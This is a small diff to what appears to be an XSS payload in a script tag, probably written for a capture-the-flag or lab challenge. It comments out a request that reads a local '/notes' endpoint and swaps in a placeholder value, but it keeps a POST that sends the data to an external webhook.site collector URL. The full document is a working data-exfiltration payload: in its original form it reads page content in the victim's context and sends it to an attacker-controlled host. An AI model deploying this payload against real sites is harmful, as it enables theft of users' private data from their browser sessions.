@@ -1,12 +1,13 @@
 <script>
-var req = new XMLHttpRequest();
+// var req = new XMLHttpRequest();
 
-req.open('GET', 'http://0.0.0.0:8080/notes', false);
-req.send(null);
-var a = ''
-if(req.status == 200) {
-  a = req.responseText;
-}
+// req.open('GET', 'http://0.0.0.0:8080/notes', false);
+// req.send(null);
+// var a = ''
+// if(req.status == 200) {
+//   a = req.responseText;
+// }
+var a = '1234'
 var req_webhook = new XMLHttpRequest();
 req_webhook.open('POST', `https://webhook.site/be1f8c0e-24d7-4dcd-a109-098da8ae468f`, false);
 req_webhook.send(a);
